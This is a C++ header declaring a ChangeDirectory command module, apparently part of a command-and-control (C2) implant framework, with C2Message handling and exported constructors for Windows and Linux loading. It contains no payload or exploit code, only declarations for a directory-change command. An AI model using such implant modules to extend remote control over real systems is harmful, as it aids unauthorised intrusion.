#pragma once

#include "ModuleCmd.hpp"


class ChangeDirectory : public ModuleCmd
{

public:
    ChangeDirectory();
    ~ChangeDirectory();

    std::string getInfo();

    int init(std::vector<std::string>& splitedCmd, C2Message& c2Message);
    int process(C2Message& c2Message, C2Message& c2RetMessage);
    int errorCodeToMsg(const C2Message& c2RetMessage, std::string& errorMsg) override;
    int osCompatibility() 
    {
        return OS_LINUX | OS_WINDOWS;
    }

private:
    bool changeDirectory(const std::string& path, std::string& result);

};


#ifdef _WIN32

extern "C" __declspec(dllexport) ChangeDirectory * ChangeDirectoryConstructor();

#else

extern "C"  __attribute__((visibility("default"))) ChangeDirectory * ChangeDirectoryConstructor();

#endif
